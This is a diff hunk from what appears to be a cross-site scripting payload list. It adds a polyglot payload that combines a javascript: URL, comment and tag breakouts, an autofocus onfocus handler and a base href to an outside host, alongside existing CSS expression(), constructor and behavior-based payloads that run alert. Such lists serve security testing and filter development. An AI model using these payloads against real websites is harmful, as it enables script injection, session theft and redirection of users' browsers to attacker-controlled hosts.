@@ -531,6 +531,7 @@ ABC<div style="x:exp\x5Cression(javascript:alert(1)">DEF
 ABC<div style="x:expression\x00(javascript:alert(1)">DEF
 ABC<div style="x:expression\x5C(javascript:alert(1)">DEF
 ABC<div style="x\x3Aexpression(javascript:alert(1)">DEF
+JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
 On Mouse Over​
 Set.constructor`alert\x28document.domain\x29```
 X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >
